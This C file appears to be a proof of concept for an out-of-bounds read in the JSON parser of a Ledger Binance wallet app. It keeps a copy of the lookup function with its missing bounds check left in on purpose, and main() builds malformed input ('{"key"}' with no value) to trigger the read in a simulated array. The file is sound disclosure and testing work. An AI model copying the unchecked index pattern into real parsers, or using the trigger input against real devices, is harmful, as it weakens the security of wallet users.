#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

// Mock JSMN types
typedef enum {
    JSMN_UNDEFINED = 0,
    JSMN_OBJECT = 1,
    JSMN_ARRAY = 2,
    JSMN_STRING = 3,
    JSMN_PRIMITIVE = 4
} jsmntype_t;

typedef struct {
    jsmntype_t type;
    int start;
    int end;
    int size;
} jsmntok_t;

typedef struct {
    jsmntok_t Tokens[10];
    int NumberOfTokens;
    bool IsValid;
} parsed_json_t;

// --- VULNERABLE FUNCTION: OOB Read ---
// Location: src/lib/json_parser.c
// Bug: token_index is incremented to fetch key_token, then used IMMEDIATELY 
//      to fetch value_token without a second bounds check.
int16_t object_get_value_vulnerable(uint16_t object_token_index,
                         const char *key_name,
                         const parsed_json_t *parsed_transaction,
                         const char *transaction) {
    
    size_t length = strlen(key_name);
    jsmntok_t object_token = parsed_transaction->Tokens[object_token_index];
    int token_index = object_token_index;
    int prev_element_end = object_token.start;
    token_index++;

    while (true) {
        // Bounds check only happens at the start of the loop
        if (token_index >= parsed_transaction->NumberOfTokens) {
            break;
        }

        // Key is fetched and token_index is incremented
        jsmntok_t key_token = parsed_transaction->Tokens[token_index++];
        
        // BUG: value_token is fetched using token_index WITHOUT checking 
        // if token_index is now >= NumberOfTokens.
        jsmntok_t value_token = parsed_transaction->Tokens[token_index]; 

        // Simulation of memory leak or crash behavior
        printf("[*] Accessing Token Index: %d (Max Valid Index: %d)\n", 
                token_index, parsed_transaction->NumberOfTokens - 1);

        if (token_index >= parsed_transaction->NumberOfTokens) {
            printf("[!] ALERT: Out-of-Bounds Read detected!\n");
            printf("    Read data from index %d: Type=%d, Start=%d, End=%d\n", 
                    token_index, value_token.type, value_token.start, value_token.end);
            return -2; // Indicator of OOB Read
        }

        // Standard comparison logic (simplified for PoC)
        if (key_token.start > object_token.end) break;
        token_index++; // Move to next pair
    }
    return -1;
}

int main() {
    parsed_json_t pj;
    const char *tx = "{\"key\"}"; // Malformed JSON: Object with key but no value

    // Manually construct the token array to trigger the edge case
    pj.NumberOfTokens = 2; // Token 0: Object, Token 1: Key
    pj.IsValid = true;

    // Token 0: The Object {}
    pj.Tokens[0].type = JSMN_OBJECT;
    pj.Tokens[0].start = 0;
    pj.Tokens[0].end = 7;
    pj.Tokens[0].size = 1;

    // Token 1: The Key "key"
    pj.Tokens[1].type = JSMN_STRING;
    pj.Tokens[1].start = 2;
    pj.Tokens[1].end = 5;
    pj.Tokens[1].size = 0;

    // Token 2: This is OUT OF BOUNDS memory (Simulated by initialization)
    // In a real exploit, this contains adjacent memory like pj.NumberOfTokens
    pj.Tokens[2].type = (jsmntype_t)99; 
    pj.Tokens[2].start = 0xDEAD;
    pj.Tokens[2].end = 0xBEEF;

    printf("--- Ledger App Binance: Out-of-Bounds Read PoC ---\n\n");
    printf("[*] Input String: %s\n", tx);
    printf("[*] Number of Valid Tokens: %d\n", pj.NumberOfTokens);
    printf("[*] Triggering vulnerable object_get_value()...\n\n");

    int result = object_get_value_vulnerable(0, "key", &pj, tx);

    if (result == -2) {
        printf("\n[VULNERABILITY CONFIRMED] The parser read past the 'Tokens' array boundary.\n");
    } else {
        printf("\n[-] Vulnerability not triggered.\n");
    }

    return 0;
}
